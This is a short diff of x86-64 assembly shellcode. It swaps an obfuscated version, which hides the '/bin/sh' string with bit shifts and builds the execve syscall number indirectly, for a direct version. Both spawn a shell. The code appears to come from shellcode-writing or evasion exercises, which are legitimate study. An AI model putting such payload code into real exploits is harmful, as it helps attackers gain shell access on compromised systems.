@@ -12,16 +12,14 @@ global _start
 section .text
 
 _start:
- 
- mov rbx, 0x68732f6e69622fee
- shr rbx, 0x2
- shr rbx, 0x2
- shr rbx, 0x4
+ xor rdx, rdx 
+ cld
+ mov rbx, 0x68732f2f6e69622f
+ push rdi
  push rbx
  mov rdi, rsp
  push rax
  push rdi
  mov rsi, rsp
- mov al, 0x3a ; execve(3b)
- inc     rax
+ mov al, 0x3b ; execve(3b)
  syscall
